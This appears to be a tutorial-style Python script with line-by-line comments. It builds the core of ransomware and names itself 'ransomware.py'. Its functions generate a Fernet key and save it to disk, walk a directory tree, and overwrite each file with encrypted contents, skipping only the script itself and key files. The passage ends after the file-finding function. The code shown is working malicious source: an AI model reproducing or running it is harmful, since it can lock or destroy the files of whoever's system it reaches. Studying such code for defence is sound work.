from cryptography.fernet import Fernet
import os
# In the first block of code, we import the necessary libraries. We import Fernet from the cryptography library to handle encryption and decryption.

def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
# The generate_key function generates a new encryption key using Fernet and saves it to a file named "key.key". This key will be used for encrypting and decrypting files.

def load_key():
    return open("key.key", "rb").read()
# The load_key function reads the encryption key from the "key.key" file and returns it. This allows us to use the same key for both encryption and decryption.

def encrypt_file(file_name, key):
    f = Fernet(key)
    with open(file_name, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_name, "wb") as file:
        file.write(encrypted_data)
# The encrypt_file function takes a file name and an encryption key as input. It reads the file, encrypts its contents using the Fernet cipher, and writes the encrypted data back to the same file.

def find_files(directory):
    list_of_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            way = os.path.join(root, file)
            if file != "ransomware.py" and not file.endswith(".key"):
                list_of_files.append(way)
    return list_of_files
# The find_files function traverses a given directory and its subdirectories to find all files.

